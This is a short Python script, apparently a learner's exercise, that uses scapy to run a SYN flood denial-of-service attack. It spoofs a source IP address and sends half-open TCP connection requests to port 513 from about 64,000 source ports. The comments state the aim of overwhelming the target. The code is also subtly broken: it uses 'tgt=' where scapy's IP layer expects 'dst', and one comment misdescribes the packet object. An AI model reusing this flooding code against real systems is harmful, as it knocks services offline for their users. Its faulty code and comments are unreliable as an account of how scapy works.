from scapy.all import send,sr1
from scapy.layers.inet import IP,TCP

#defining function syn flood or tcp flood that will send tcp network syn packet in order to establish half open connections with the serve and in enormous quantities in order to overwhelm the target system

def syn_flood(source,target):
    # now we will be defining our ip layer and tcp layer 
    for sport in range(1024,65535): #sport here is the source port which we will be changing after sending connection request to the destination port or dport
        ip_layer=IP(src=source,tgt=target)
        tcp_layer=TCP(sport=sport,dport=513)
        pkt=ip_layer/tcp_layer #this is basically the number of packets we want to send
        send(pkt) #sending packet using scapy.all (top all level objects)

source='10.10.55.122'
target='127.0.0.1'
syn_flood(source=source,target=target)